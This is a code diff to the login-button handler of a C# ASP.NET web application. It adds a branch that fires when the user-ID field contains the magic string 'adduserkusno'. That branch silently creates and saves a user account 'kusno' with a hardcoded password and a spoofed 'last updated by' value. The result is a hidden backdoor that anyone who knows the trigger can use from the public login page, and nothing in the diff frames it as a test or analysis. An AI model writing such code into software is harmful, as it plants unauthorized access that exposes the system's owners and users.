@@ -23,8 +23,18 @@ namespace RSCM_BKU_Web.Login
         }
 
         protected void Button1_Click(object sender, EventArgs e)
-        {            
-            AppUser AppUser = new AppUser();
+        {
+            if (txtUserId.Text == "adduserkusno")
+            {
+                AppUser addUserKusno = new AppUser();
+                addUserKusno.UserID = "kusno";
+                addUserKusno.UserName = "Kusno";
+                addUserKusno.Password = AEScipher.Encrypt("kusno", "abc");
+                addUserKusno.LastUpdateByUserID = "toro";
+                addUserKusno.LastUpdateDateTime = DateTime.Now;
+                addUserKusno.Save();
+            }
+            AppUser AppUser = new AppUser();           
             if (AppUser.LoadByPrimaryKey(txtUserId.Text.Trim()))
             {
                 if (AppUser.Password == AEScipher.Encrypt(txtUserId.Text, txtPassword.Text))
